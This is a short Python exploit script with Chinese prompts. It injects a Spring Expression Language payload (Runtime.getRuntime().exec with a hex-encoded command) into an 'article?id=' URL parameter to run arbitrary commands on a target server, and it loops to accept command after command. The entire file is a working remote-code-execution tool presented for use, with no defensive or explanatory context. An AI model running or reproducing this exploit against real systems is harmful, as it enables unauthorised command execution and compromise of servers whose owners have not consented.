#! usr/bin/env python
# writer: yueji0j1anke

import requests
import base64
import colorama

def attack(target,cmd):
    cmd =  convert_payload(cmd)
    url = target + 'article?id=${T(java.lang.Runtime).getRuntime().exec(new String(new byte[]{'+ cmd +'}))}'
    print(url)
    headers = {
        'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)'
    }

    try:
        response = requests.get(url=url, headers=headers)
        print(response.text)
        print(colorama.Fore.GREEN + "[info] 利用成功,若没反弹calc，请在浏览器上提交一试")
    except Exception as e:
        print(colorama.Fore.RED + "[error] 发生错误：{}".format(e))


def convert_payload(cmd):
    result = ""
    for x in cmd:
        result += hex(ord(x)) + ","
    return result.rstrip(',')

if __name__ == '__main__':
    target = input("请输入你的target: ")
    cmd = input("请输入你要执行的cmd: ")
    while True:
        print(colorama.Fore.GREEN + "[info] 开始利用")
        attack(target, cmd)
        cmd = input("请输入你要执行的下一个cmd: ")


